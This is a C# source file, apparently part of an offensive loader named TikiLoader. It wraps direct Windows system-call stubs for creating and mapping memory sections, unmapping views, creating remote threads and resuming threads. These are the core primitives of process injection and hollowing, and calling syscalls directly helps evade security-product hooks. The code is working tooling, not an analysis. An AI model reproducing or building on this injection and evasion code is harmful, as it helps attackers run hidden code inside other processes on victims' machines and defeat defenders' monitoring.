using System;
using System.Runtime.InteropServices;

namespace TikiLoader
{
    public static class Syscall
    {
        public static uint NtCreateSection(ref IntPtr sectionHandle, uint desiredAccess, IntPtr objectAttributes, ref ulong maximumSize, uint sectionPageProtection, uint allocationAttributes, IntPtr fileHandle)
        {
            var stub = Generic.GetSyscallStub("NtCreateSection");
            var ntCreateSection = (Delegates.NtCreateSection) Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtCreateSection));

            return ntCreateSection(
                ref sectionHandle,
                desiredAccess,
                objectAttributes,
                ref maximumSize,
                sectionPageProtection,
                allocationAttributes,
                fileHandle);
        }
        
        public static uint NtMapViewOfSection(IntPtr sectionHandle, IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, IntPtr commitSize, IntPtr sectionOffset, ref ulong viewSize, uint inheritDisposition, uint allocationType, uint win32Protect)
        {
            var stub = Generic.GetSyscallStub("NtMapViewOfSection");
            var ntMapViewOfSection = (Delegates.NtMapViewOfSection) Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtMapViewOfSection));

            return ntMapViewOfSection(
                sectionHandle,
                processHandle,
                ref baseAddress,
                zeroBits,
                commitSize,
                sectionOffset,
                ref viewSize,
                inheritDisposition,
                allocationType,
                win32Protect);
        }
        
        public static uint NtResumeThread(IntPtr hThread, IntPtr suspendCount)
        {
            var stub = Generic.GetSyscallStub("NtResumeThread");
            var ntResumeThread = (Delegates.NtResumeThread) Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtResumeThread));

            return ntResumeThread(hThread, suspendCount);
        }
        
        public static uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddress)
        {
            var stub = Generic.GetSyscallStub("NtUnmapViewOfSection");
            var ntUnmapViewOfSection = (Delegates.NtUnmapViewOfSection) Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtUnmapViewOfSection));

            return ntUnmapViewOfSection(hProcess, baseAddress);
        }
        
        public static uint NtCreateThreadEx(ref IntPtr threadHandle, Data.Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            var stub = Generic.GetSyscallStub("NtCreateThreadEx");
            var ntCreateThreadEx = (Delegates.NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, typeof(Delegates.NtCreateThreadEx));

            return ntCreateThreadEx(
                ref threadHandle,
                desiredAccess,
                objectAttributes,
                processHandle,
                startAddress,
                parameter,
                createSuspended,
                stackZeroBits,
                sizeOfStack,
                maximumStackSize,
                attributeList);
        }
    }
}